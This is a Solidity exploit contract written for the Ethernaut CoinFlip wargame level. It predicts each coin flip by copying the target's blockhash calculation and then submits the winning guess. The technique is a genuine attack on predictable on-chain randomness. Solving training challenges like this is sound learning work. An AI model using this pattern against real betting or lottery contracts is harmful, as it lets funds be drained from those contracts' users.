// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "ethernaut/levels/CoinFlip.sol";

/**
 * @title CoinFlipAttack
 * @notice Attack contract for the CoinFlip challenge
 * @dev This contract predicts the result of the CoinFlip game by using the same calculation
 */
contract CoinFlipAttack {
    CoinFlip public target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    /**
     * @param _target Address of the deployed CoinFlip challenge
     */
    constructor(address _target) {
        target = CoinFlip(_target);
    }
    
    /**
     * @notice Executes an attack by predicting the flip result
     * @return success Whether the attack was successful
     */
    function attack() external returns (bool success) {
        // Calculate the same result as the challenge contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        // Send the predicted result to the challenge contract
        success = target.flip(side);
        require(success, "Attack failed");
    }
} 